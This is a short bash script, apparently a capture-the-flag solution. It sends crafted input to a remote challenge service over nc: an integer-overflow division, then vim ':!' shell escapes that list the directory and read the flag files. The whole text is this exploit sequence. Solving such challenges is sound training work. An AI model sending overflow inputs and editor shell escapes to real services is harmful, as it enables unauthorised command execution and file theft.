#!/bin/bash
echo -e "-2147483648/-1\nvim\n:!ls -la\n:!cat flag\n:!cat ./-" | nc 202.38.95.46 12008 | grep flag
